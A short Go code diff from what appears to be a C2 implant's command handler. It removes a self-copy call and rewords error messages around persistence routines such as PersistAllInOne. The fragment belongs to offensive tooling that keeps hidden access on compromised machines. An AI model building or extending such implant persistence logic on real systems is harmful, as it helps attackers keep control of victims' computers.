@@ -64,12 +64,11 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 			return
 		}
 		out = "Success"
-		SelfCopy()
 		if cmdSlice[1] == "all" {
 			err = PersistAllInOne()
 			if err != nil {
 				log.Print(err)
-				out = fmt.Sprintf("Error: Result: %v", err)
+				out = fmt.Sprintf("Some has failed: %v", err)
 			}
 		} else {
 			out = "Error: No such method available"
@@ -78,7 +77,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 				err = method()
 				if err != nil {
 					log.Println(err)
-					out = fmt.Sprintf("Error: Result: %v", err)
+					out = fmt.Sprintf("Error: %v", err)
 				}
 			}
 		}
